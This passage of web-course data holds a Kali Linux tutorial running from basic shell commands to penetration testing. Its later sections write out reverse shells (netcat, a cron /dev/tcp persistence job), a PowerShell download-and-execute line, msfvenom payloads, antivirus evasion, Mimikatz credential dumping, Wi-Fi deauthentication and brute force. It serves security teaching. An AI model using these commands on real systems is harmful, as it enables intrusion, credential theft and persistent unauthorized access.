                            <p class="pl-6 mb-4"><strong>Systems:</strong></p>
                            <p class="pl-6 mb-4">VirtualBox/VMware: For setting up isolated environments.</p>
                            <p class="pl-6 mb-4">Metasploitable 2/3: For vulnerable services.</p>
                            <p class="pl-6 mb-4">OWASP Juice Shop: For web application exploitation.</p>
                
                            <p class="pl-6 mb-4"><strong>Platforms:</strong></p>
                            <p class="pl-6 mb-4">AWS or Azure: Optional for cloud environments.</p>
                            <p class="pl-6 mb-4">Hack The Box or TryHackMe: Optional for additional practical labs.</p>
                        `},
                    {
                        title: 'Comprehensive Practical Guide: Kali Linux Commands (Beginner to Advanced)',
                        content: `
                            <p class="pl-6 mb-4">Kali Linux is a powerful platform tailored for penetration testing and ethical hacking, offering a vast array of tools and utilities. However, to fully harness its potential, users must become proficient with its Linux command-line interface (CLI). This guide provides an in-depth practical tutorial on Kali Linux commands, from beginner to advanced, covering essential tasks for everyday usage, network operations, system management, and penetration testing.</p>
                            
                            <p class="pl-6 mb-4"><strong>Section 1: Basic Kali Linux Commands (Beginner)</strong></p>
                            <p class="pl-6 mb-4"><strong>1.1 Navigating the File System</strong></p>
                            <p class="pl-6 mb-4">Understanding the file system and how to navigate it is essential.</p>
                            <p class="pl-6 mb-4"><strong>• pwd:</strong> Print working directory (shows the current directory).</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> pwd</p>
                            <p class="pl-6 mb-4"><strong>• ls:</strong> List files and directories in the current directory.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ls</p>
                            <p class="pl-6 mb-4"><strong>Options:</strong></p>
                            <p class="pl-6 mb-4">o <strong>ls -l</strong>: Long listing format (detailed view with permissions).</p>
                            <p class="pl-6 mb-4">o <strong>ls -a</strong>: Show hidden files (files that start with .).</p>
                            <p class="pl-6 mb-4">o <strong>ls -lh</strong>: Human-readable file sizes.</p>
                            
                        `},
                    {
                        title: '',
                        content: `
                        <p class="pl-6 mb-4"><strong>• cd:</strong> Change directory.</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> cd /path/to/directory</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> cd ~ # Navigate to home directory</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> cd .. # Go up one directory</p>
                        <p class="pl-6 mb-4"><strong>• mkdir:</strong> Create a new directory.</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> mkdir new_folder</p>
                        <p class="pl-6 mb-4"><strong>• touch:</strong> Create an empty file.</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> touch newfile.txt</p>
                        <p class="pl-6 mb-4"><strong>• cp:</strong> Copy files or directories.</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> cp source_file.txt destination_file.txt</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> cp -r source_directory/ destination_directory/ # Recursive for directories</p>
                        <p class="pl-6 mb-4"><strong>• mv:</strong> Move or rename files and directories.</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> mv oldname.txt newname.txt</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> mv file.txt /path/to/new/location/</p>
                        <p class="pl-6 mb-4"><strong>• rm:</strong> Remove files or directories.</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> rm file.txt</p>
                        <p class="pl-6 mb-4">bash Copy code <br /> rm -r directory/ # Recursive removal</p>`
                    },
                    {
                        title: 'Comprehensive Practical Guide: Kali Linux Commands (Beginner to Advanced)',
                        content: `
                            <p class="pl-6 mb-4"><strong>1.2 Managing Files and Permissions</strong></p>
                            <p class="pl-6 mb-4">Kali Linux uses permissions to manage access to files and directories.</p>
                            <p class="pl-6 mb-4"><strong>• chmod:</strong> Change file permissions.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> chmod +x script.sh # Make script executable</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> chmod 755 file.txt # Full permissions for owner, read/execute for group and others</p>
                            <p class="pl-6 mb-4"><strong>• chown:</strong> Change file owner.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> chown user:group file.txt</p>
                            <p class="pl-6 mb-4"><strong>• cat:</strong> Display the contents of a file.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> cat file.txt</p>
                            <p class="pl-6 mb-4"><strong>nano / vi / vim:</strong> Command-line text editors.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> nano file.txt # Simple text editor</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> vi file.txt # Advanced text editor</p>
                            <p class="pl-6 mb-4"><strong>• find:</strong> Locate files within the file system.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> find / -name "filename.txt"</p>
                            <p class="pl-6 mb-4"><strong>• locate:</strong> Find files quickly by using a pre-built database.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> locate file.txt</p>
                        `},
                    {
                        title: 'Section 2: Networking Commands and System Monitoring (Intermediate)',
                        content: `
                            <p class="pl-6 mb-4"><strong>2.1 Network Configuration and Scanning</strong></p>
                            <p class="pl-6 mb-4">Networking commands allow you to inspect network interfaces, manage IP addresses, and monitor traffic.</p>
                            <p class="pl-6 mb-4"><strong>• ifconfig:</strong> Display or configure network interfaces (replaced by ip in newer versions).</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ifconfig</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ifconfig eth0 down # Disable interface</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ifconfig eth0 up # Enable interface</p>
                            <p class="pl-6 mb-4"><strong>• ip:</strong> Configure and display network interfaces.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ip addr show</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ip link set eth0 up</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ip addr add 192.168.1.10/24 dev eth0</p>
                            <p class="pl-6 mb-4"><strong>• ping:</strong> Check the availability of a host.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ping example.com</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ping -c 4 192.168.1.1 # Send 4 ICMP packets</p>
                            <p class="pl-6 mb-4"><strong>• netstat:</strong> Display network connections, routing tables, and interface statistics.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> netstat -tuln # Show active listening ports</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> netstat -an | grep 80 # Filter for port 80 traffic</p>
                            <p class="pl-6 mb-4"><strong>• traceroute:</strong> Trace the path to a host.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> traceroute example.com</p>
                            <p class="pl-6 mb-4"><strong>• nmap:</strong> Network scanning and host discovery (essential for pentesting).</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> nmap -sS -Pn 192.168.1.0/24 # Stealth scan of a network</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> nmap -O target_ip # OS detection</p>
                        `},
                    {
                        title: '2.2 System Monitoring and Resource Management',
                        content: `
                            <p class="pl-6 mb-4">Monitoring system resources such as CPU, memory, and processes is critical for performance optimization and troubleshooting.</p>
                            <p class="pl-6 mb-4"><strong>• top:</strong> Real-time process monitoring.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> top</p>
                            <p class="pl-6 mb-4"><strong>• htop:</strong> An enhanced version of top with a better user interface (must be installed separately).</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> htop</p>
                            <p class="pl-6 mb-4"><strong>• ps:</strong> Display information about active processes.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ps aux # Show all running processes</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> ps -ef | grep ssh # Find processes related to SSH</p>
                            <p class="pl-6 mb-4"><strong>• kill:</strong> Terminate a process.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> kill PID # Replace PID with the process ID</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> kill -9 PID # Forcefully kill a process</p>
                            <p class="pl-6 mb-4"><strong>• df:</strong> Display disk space usage.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> df -h # Human-readable format</p>
                            <p class="pl-6 mb-4"><strong>• du:</strong> Check disk usage of files and directories.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> du -sh /path/to/folder</p>
                        `},
                    {
                        title: '3.1 Bash Scripting',
                        content: `
                            <p class="pl-6 mb-4">Bash is the command-line interpreter used in Kali Linux. Writing bash scripts automates repetitive tasks and enhances productivity.</p>
                            <p class="pl-6 mb-4"><strong>• Script Basics:</strong> A simple script to print a message and list files.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> #!/bin/bash <br /> echo "Hello, Kali!" <br /> ls -l</p>
                            <p class="pl-6 mb-4"><strong>• Variables:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> name="Kali" <br /> echo "Welcome to $name"</p>
                            <p class="pl-6 mb-4"><strong>• Conditionals:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> if [ -f "file.txt" ]; then <br />     echo "File exists" <br /> else <br />     echo "File does not exist" <br /> fi</p>
                            <p class="pl-6 mb-4"><strong>• Loops:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> for i in {1..5}; do <br />     echo "Iteration $i" <br /> done</p>
                            <p class="pl-6 mb-4"><strong>• Functions:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> function greet() { <br />     echo "Hello, $1!" <br /> } <br /> greet "Kali"</p>
                        `},
                    {
                        title: '3.2 Advanced Networking and Attacks',
                        content: `
                            <p class="pl-6 mb-4"><strong>• tcpdump:</strong> Capture network traffic for analysis.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> tcpdump -i eth0 -w capture.pcap # Capture all traffic on eth0 <br /> tcpdump -i eth0 'port 80' # Capture HTTP traffic</p>
                            <p class="pl-6 mb-4"><strong>• Wireshark:</strong> GUI-based network protocol analyzer (must be launched from the terminal in Kali).</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> wireshark</p>
                            <p class="pl-6 mb-4"><strong>• airmon-ng / airodump-ng / aireplay-ng:</strong> Wireless hacking tools used to monitor, capture, and inject packets.</p>
                            <p class="pl-6 mb-4"><strong>Steps to perform a wireless network scan:</strong></p>
                            <p class="pl-6 mb-4"><strong>1. Enable monitor mode:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> airmon-ng start wlan0</p>
                            <p class="pl-6 mb-4"><strong>2. Capture packets:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> airodump-ng wlan0mon</p>
                            <p class="pl-6 mb-4"><strong>3. Deauthenticate users (e.g., for WPA handshake capture):</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> aireplay-ng --deauth 10 -a <AP_MAC> wlan0mon</p>
                        `},
                    {
                        title: '3.3 Exploitation Frameworks',
                        content: `
                            <p class="pl-6 mb-4"><strong>Kali Linux includes powerful exploitation frameworks for performing sophisticated attacks.</strong></p>
                            <p class="pl-6 mb-4"><strong>• Metasploit:</strong> The most commonly used framework for penetration testing.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> msfconsole # Start Metasploit</p>
                            <p class="pl-6 mb-4"><strong>Example:</strong></p>
                            <p class="pl-6 mb-4"><strong>1. Search for vulnerabilities:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> search vsftpd</p>
                            <p class="pl-6 mb-4"><strong>2. Use the exploit module:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> use exploit/unix/ftp/vsftpd_234_backdoor</p>
                            <p class="pl-6 mb-4"><strong>3. Set target and payload options:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> set RHOST <target_ip> <br /> set PAYLOAD linux/x86/shell/reverse_tcp</p>
                            <p class="pl-6 mb-4"><strong>4. Run the exploit:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> exploit</p>
                            <p class="pl-6 mb-4"><strong>• SQLMap:</strong> Automated SQL injection tool.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> sqlmap -u "http://target_ip/vulnerable_page.php?id=1" --dbs</p>
                            <p class="pl-6 mb-4"><strong>• John the Ripper:</strong> Password cracking utility.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt</p>
                        `},
                    {
                        title: 'Section 4: Pentesting, Forensics, and Custom Tools (Expert)',
                        content: `
                            <p class="pl-6 mb-4"><strong>4.1 Customizing Tools and Scripts</strong></p>
                            <p class="pl-6 mb-4">As an advanced user, customizing tools and writing scripts is key to enhancing flexibility in penetration tests.</p>
                            <p class="pl-6 mb-4"><strong>• Creating Payloads with msfvenom:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > shell.exe</p>
                            <p class="pl-6 mb-4"><strong>• Compiling Exploits:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> gcc exploit.c -o exploit</p>
                
                            <p class="pl-6 mb-4"><strong>4.2 Digital Forensics Tools</strong></p>
                            <p class="pl-6 mb-4"><strong>• Autopsy:</strong> GUI-based digital forensics tool.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> autopsy</p>
                            <p class="pl-6 mb-4"><strong>• foremost:</strong> File recovery tool for forensics.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> foremost -i disk_image.img -o output_folder</p>
                            <p class="pl-6 mb-4"><strong>• Volatility:</strong> Memory forensics tool.</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> volatility -f memory_dump.raw pslist</p>
                
                            <p class="pl-6 mb-4"><strong>4.3 Managing Services and Tools</strong></p>
                            <p class="pl-6 mb-4"><strong>• Service management:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> service apache2 start <br /> service ssh start</p>
                            <p class="pl-6 mb-4"><strong>• Crontab:</strong> Schedule tasks (useful for persistence in pentests).</p>
                            <p class="pl-6 mb-4">bash Copy code <br /> crontab -e # Edit the cron jobs</p>
                            <p class="pl-6 mb-4"><strong>• Netcat:</strong> The swiss army knife of networking.</p>
                            <p class="pl-6 mb-4"><strong>• Reverse shell:</strong></p>
                            <p class="pl-6 mb-4">bash Copy code <br /> nc -lvnp 4444 # On Kali (listening) <br /> nc target_ip 4444 -e /bin/bash # On target (connecting back)</p>
                        `},
                        {
                            title: 'Section 5: Real-World Applications and Exercises',
                            content: `
                                <p class="pl-6 mb-4"><strong>5.1 Real-World Scenario: Web Application Exploitation</strong></p>
                                <p class="pl-6 mb-4">1. Target: A vulnerable web application (e.g., DVWA or OWASP Juice Shop).</p>
                                <p class="pl-6 mb-4">2. Tools: Burp Suite, SQLMap, Metasploit.</p>
                                <p class="pl-6 mb-4">3. Tasks:</p>
                                <ul class="pl-6 mb-4">
                                    <li>Perform SQL injection and dump the database.</li>
                                    <li>Capture sensitive data through Cross-Site Scripting (XSS).</li>
                                </ul>
                                
                                <p class="pl-6 mb-4"><strong>5.2 Real-World Scenario: Post-Exploitation</strong></p>
                                <p class="pl-6 mb-4">1. Target: Compromised Windows/Linux machine.</p>
                                <p class="pl-6 mb-4">2. Tools: Metasploit, Mimikatz.</p>
                                <p class="pl-6 mb-4">3. Tasks:</p>
                                <ul class="pl-6 mb-4">
                                    <li>Dump passwords and escalate privileges.</li>
                                    <li>Perform lateral movement using SSH and PsExec.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>Additional Resources:</strong></p>
                                <ul class="pl-6 mb-4">
                                    <li><a href="https://www.kali.org/docs/">Kali Linux Documentation</a></li>
                                    <li><a href="https://www.exploit-db.com/">Exploit Database</a></li>
                                    <li><a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a></li>
                                </ul>
                    
                                <p class="pl-6 mb-4">This guide offers a comprehensive journey through Kali Linux commands, from basic file operations to advanced penetration testing and forensics. Mastering these commands will provide you with the necessary skills for conducting real-world penetration tests, cyber forensics, and custom tool creation.</p>
                            `},
                    {
                        title: 'Advanced Kali Linux Tips and Tricks for Penetration Testing and Cybersecurity',
                        content: `
                            <p class="pl-6 mb-4">Kali Linux is a powerful operating system packed with numerous tools for penetration testing, ethical hacking, and cybersecurity. To truly master the platform, it’s important to understand some of the advanced tips, tricks, and shortcuts that can make your workflow more efficient and productive. Below are advanced tips and tricks that will enhance your use of Kali Linux as you progress through your ethical hacking and penetration testing career.</p>
                            
                            <p class="pl-6 mb-4"><strong>1. General Kali Linux Command-Line Tricks</strong></p>
                            
                            <p class="pl-6 mb-4"><strong>1.1 Autocompletion and Command History</strong></p>
                            <ul class="pl-6 mb-4">
                                <li><strong>Tab Completion:</strong> When typing a command or file path, pressing Tab autocompletes the path or command, saving time. 
                                    <br><strong>Example:</strong> Typing <code>cd /us</code> followed by Tab will autocomplete to <code>/usr/</code>.</li>
                                <li><strong>Command History:</strong> Use the <code>history</code> command to view previously executed commands, or press <strong>Ctrl + R</strong> to reverse-search through your command history. 
                                    <br><strong>Example:</strong> Type <code>history</code> to see a list of recent commands, or use <strong>Ctrl + R</strong> and start typing a previously used command to find and reuse it.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>1.2 Advanced File Search and Operations</strong></p>
                            <ul class="pl-6 mb-4">
                                <li><strong>Locate Fast Search:</strong> Update the database first and then use <code>locate</code> to quickly find files.
                                    <br><code>sudo updatedb</code>
                                    <br><code>locate &lt;filename&gt;</code></li>
                                <li><strong>Find Files by Extension:</strong> Use the <code>find</code> command to search for specific file types or names across directories.
                                    <br><code>find / -name "*.php" 2>/dev/null</code> # Search for all .php files</li>
                                <li><strong>Search File Content:</strong> Use <code>grep</code> to search within files.
                                    <br><code>grep "password" /etc/passwd</code>
                                    <br><code>grep -r "admin" /var/www/html/</code> # Recursively search for the string "admin"</li>
                            </ul>
                        `},
                        {
                            title: 'Advanced Kali Linux Tips and Tricks for Penetration Testing and Cybersecurity',
                            content: `
                                <p class="pl-6 mb-4"><strong>1.3 Creating Aliases for Common Commands</strong></p>
                                <p class="pl-6 mb-4">You can create aliases to shorten long or frequently used commands. Edit the .bashrc file to create permanent aliases.</p>
                                <ul class="pl-6 mb-4">
                                    <li><strong>Example:</strong> Instead of typing <code>nmap -sS -Pn</code>, you can create an alias: 
                                        <br><code>alias quicknmap="nmap -sS -Pn"</code></li>
                                    <li>To make this permanent, add the alias to <code>~/.bashrc</code> and then run: 
                                        <br><code>source ~/.bashrc</code></li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>1.4 Download and Execute Scripts on the Fly</strong></p>
                                <p class="pl-6 mb-4">Download and run scripts directly from the command line without saving them first using curl or wget.</p>
                                <ul class="pl-6 mb-4">
                                    <li><strong>Example:</strong> Run a script directly from a URL using curl and bash:
                                        <br><code>curl -s http://example.com/myscript.sh | bash</code></li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>2. Power User Tips for Kali Linux Networking and Scanning</strong></p>
                    
                                <p class="pl-6 mb-4"><strong>2.1 Speed Up Nmap Scans with Timing Options</strong></p>
                                <p class="pl-6 mb-4">If you’re scanning large networks or want faster results in an engagement, you can adjust Nmap’s timing options to increase the speed at the cost of stealth.</p>
                                <ul class="pl-6 mb-4">
                                    <li><strong>Aggressive Timing:</strong> Use <code>-T4</code> for faster scans (less stealthy). 
                                        <br><code>nmap -T4 -sS -Pn 192.168.1.0/24</code></li>
                                    <li><strong>Stealth Scans:</strong> Use <code>-T2</code> or <code>-T1</code> to slow down the scan, making it harder to detect by firewalls and IDS/IPS systems.
                                        <br><code>nmap -T1 -sS -Pn 192.168.1.0/24</code></li>
                                </ul>
                            ` },
                            {
                                title: 'Advanced Kali Linux Tips and Tricks for Penetration Testing and Cybersecurity',
                                content: `
                                    <p class="pl-6 mb-4"><strong>2.2 Use Banner Grabbing with Netcat for Service Information</strong></p>
                                    <p class="pl-6 mb-4">Sometimes, you can use Netcat to grab service banners that provide critical version and software information for vulnerability identification.</p>
                                    <ul class="pl-6 mb-4">
                                        <li><strong>Example:</strong> Connect to an HTTP or FTP server and grab the banner.
                                            <br><code>nc <target_ip> 80 # For HTTP</code>
                                            <br><code>nc <target_ip> 21 # For FTP</code></li>
                                        <li>Once connected, type a basic HTTP request like <code>GET / HTTP/1.1</code> and press enter twice to see the server response.</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4"><strong>2.3 Automate Reconnaissance with Automator</strong></p>
                                    <p class="pl-6 mb-4">Save time by automating OSINT and recon tasks with a tool like Automator or Recon-ng.</p>
                                    <ul class="pl-6 mb-4">
                                        <li><strong>Automator</strong> provides basic recon for domains, IPs, or URLs:
                                            <br><code>automator example.com</code></li>
                                        <li><strong>Recon-ng</strong> is a powerful OSINT tool that provides recon modules for social media mining, domain enumeration, and more.
                                            <br><code>recon-ng</code>
                                            <br><code>use recon/domains-hosts/whois_pocs run</code></li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4"><strong>2.4 Leverage Masscan for Fast Network Scanning</strong></p>
                                    <p class="pl-6 mb-4">Masscan is a network scanner similar to Nmap but optimized for speed, making it ideal for scanning large networks quickly.</p>
                                    <ul class="pl-6 mb-4">
                                        <li><strong>Example:</strong> Use Masscan to scan a /16 network range.
                                            <br><code>masscan -p80,443 192.168.0.0/16 --rate 1000</code></li>
                                    </ul>
                                `},
                                {
                                    title: 'Advanced Exploitation and Post-Exploitation Tips',
                                    content: `
                                        <p class="pl-6 mb-4"><strong>3.1 Speed Up Metasploit with Search Filters</strong></p>
                                        <p class="pl-6 mb-4">When using Metasploit, filter your searches for faster results by specifying the exploit type, platform, or target.</p>
                                        <ul class="pl-6 mb-4">
                                            <li><strong>Example:</strong> Search for a Windows-specific vulnerability in Metasploit:
                                                <br><code>search platform:windows type:exploit</code></li>
                                        </ul>
                            
                                        <p class="pl-6 mb-4"><strong>3.2 Use the Metasploit exploit suggester</strong></p>
                                        <p class="pl-6 mb-4">If you have access to a target system, use the exploit suggester module to identify possible vulnerabilities based on the target's configuration.</p>
                                        <ul class="pl-6 mb-4">
                                            <li><strong>Example:</strong> Once you have a meterpreter session on a system:
                                                <br><code>run post/multi/recon/local_exploit_suggester</code></li>
                                        </ul>
                            
                                        <p class="pl-6 mb-4"><strong>3.3 Bypass Antivirus Using Veil-Evasion</strong></p>
                                        <p class="pl-6 mb-4">Generate payloads using Veil-Evasion to bypass antivirus detection during exploitation.</p>
                                        <ul class="pl-6 mb-4">
                                            <li><strong>Example:</strong> Generate an AV-evading executable with a Meterpreter payload.
                                                <br><code>veil</code>
                                                <br><code>use python/meterpreter/rev_tcp set LHOST <your_ip> generate</code></li>
                                        </ul>
                            
                                        <p class="pl-6 mb-4"><strong>3.4 Dump Passwords on Windows with Mimikatz</strong></p>
                                        <p class="pl-6 mb-4">Use Mimikatz to dump clear-text passwords and hashes on Windows systems during postexploitation.</p>
                                        <ul class="pl-6 mb-4">
                                            <li><strong>Example:</strong> Use Mimikatz to dump credentials after exploiting a Windows box.
                                                <br><code>mimikatz.exe sekurlsa::logonpasswords</code></li>
                                        </ul>
                            
                                        <p class="pl-6 mb-4"><strong>3.5 Use PowerShell for Fileless Exploits</strong></p>
                                        <p class="pl-6 mb-4">Use PowerShell to execute commands and scripts directly in memory, making detection more difficult.</p>
                                        <ul class="pl-6 mb-4">
                                            <li><strong>Example:</strong> Use PowerShell to download and execute a remote script:
                                                <br><code>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-url/payload.ps1')" </code></li>
                                        </ul>
                                    `},
                                    {
                                        title: 'Stealth and Persistence Tips for Red Teaming',
                                        content: `
                                            <p class="pl-6 mb-4"><strong>4.1 Use Crontab for Linux Persistence</strong></p>
                                            <p class="pl-6 mb-4">You can achieve persistence on a compromised Linux machine by creating cron jobs that run malicious scripts periodically.</p>
                                            <ul class="pl-6 mb-4">
                                                <li><strong>Example:</strong> Set up a reverse shell that connects back every minute:
                                                    <br><code>(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/<your_ip>/4444 0>&1") | crontab -</code></li>
                                            </ul>
                                
                                            <p class="pl-6 mb-4"><strong>4.2 Maintain Persistence on Windows with Scheduled Tasks</strong></p>
                                            <p class="pl-6 mb-4">On Windows systems, persistence can be maintained through scheduled tasks that trigger malicious payloads at regular intervals.</p>
                                            <ul class="pl-6 mb-4">
                                                <li><strong>Example:</strong> Create a scheduled task that runs a reverse shell:
                                                    <br><code>schtasks /create /sc minute /mo 1 /tn "PersistentShell" /tr "C:\\Windows\\System32\\cmd.exe /c <reverse_shell_command>"</code></li>
                                            </ul>
                                
                                            <p class="pl-6 mb-4"><strong>4.3 Evading Detection with Fileless Payloads</strong></p>
                                            <p class="pl-6 mb-4">Fileless payloads execute directly in memory, making them difficult to detect by traditional antivirus solutions. Combine Metasploit and PowerShell for fileless attacks.</p>
                                            <ul class="pl-6 mb-4">
                                                <li><strong>Example:</strong> Generate a payload that uses reflective DLL injection:
                                                    <br><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your_ip> LPORT=443 -f exe > meterpreter.exe</code></li>
                                            </ul>
                                        `},
                    {
                        title: 'Customizing and Optimizing Kali Linux',
                        content: `
                            <p class="pl-6 mb-4"><strong>5.1 Create Custom Tools in Python</strong></p>
                            <p class="pl-6 mb-4">You can write your own penetration testing tools in Python to automate tasks. For instance, you can create a basic port scanner in Python.</p>
                            <ul class="pl-6 mb-4">
                                <li><strong>Example:</strong> Simple Python port scanner:
                                    <br><code>import socket</code>
                                    <br><code>def scan(host, port):</code>
                                    <br><code>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code>
                                    <br><code>sock.settimeout(1)</code>
                                    <br><code>try:</code>
                                    <br><code>sock.connect((host, port))</code>
                                    <br><code>print(f"Port {port} is open.")</code>
                                    <br><code>except:</code>
                                    <br><code>print(f"Port {port} is closed.")</code>
                                    <br><code>finally:</code>
                                    <br><code>sock.close()</code>
                                    <br><code>for port in range(20, 1025):</code>
                                    <br><code>scan("192.168.1.1", port)</code></li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>5.2 Speed Up Virtual Machines in Kali Linux</strong></p>
                            <p class="pl-6 mb-4">If you’re running Kali Linux in a virtual machine, optimize its performance by adjusting the following settings:</p>
                            <ul class="pl-6 mb-4">
                                <li>Increase Virtual Machine Memory: Allocate at least 4GB RAM or more for heavy tasks.</li>
                                <li>Enable Nested Virtualization: For faster processing during tasks like password cracking.</li>
                                <li>Install Guest Additions: For better compatibility and smoother performance in VirtualBox or VMware.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>5.3 Use Tmux to Manage Multiple Terminal Sessions</strong></p>
                            <p class="pl-6 mb-4">Tmux is a terminal multiplexer that allows you to run multiple terminal sessions in the same window, making it easier to manage various tasks during penetration tests.</p>
                            <ul class="pl-6 mb-4">
                                <li><strong>Example:</strong> Start Tmux and split the window into panes for multitasking:
                                    <br><code>tmux</code>
                                    <br><code>ctrl+b % # Split pane vertically</code>
                                    <br><code>ctrl+b " # Split pane horizontally</code></li>
                            </ul>
                        `},
                    {
                        title: 'Final Pro Tips',
                        content: `
                            <p class="pl-6 mb-4"><strong>6.1 Use John the Ripper with GPU Acceleration</strong></p>
                            <p class="pl-6 mb-4">If cracking hashes is part of your engagement, leverage GPU power for faster cracking with John the Ripper.</p>
                            <ul class="pl-6 mb-4">
                                <li><strong>Example:</strong> Install OpenCL and use GPU acceleration for password cracking:
                                    <br><code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt -device=1 hashes.txt</code>
                                </li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>6.2 Password Spray Using Hydra or Medusa</strong></p>
                            <p class="pl-6 mb-4">To automate brute-force attacks on multiple services, you can use Hydra or Medusa for password spraying.</p>
                            <ul class="pl-6 mb-4">
                                <li><strong>Example:</strong> Use Hydra to attempt an SSH login with multiple credentials:
                                    <br><code>hydra -L usernames.txt -P passwords.txt ssh://192.168.1.1</code>
                                </li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Conclusion</strong></p>
                            <p class="pl-6 mb-4">These tips and tricks are designed to take your use of Kali Linux from basic proficiency to advanced mastery. By leveraging these techniques, you can streamline your penetration testing tasks, bypass security mechanisms more effectively, and automate repetitive processes, ultimately improving your efficiency and success in ethical hacking engagements.</p>
                            <p class="pl-6 mb-4">Keep experimenting and developing your own custom tools to maximize the potential of Kali Linux in your offensive and defensive cybersecurity projects.</p>
                        `}
                    ],
                    videoUrl: '',
                    commands: [],
                    content: ''
                },
        ]
    }
];







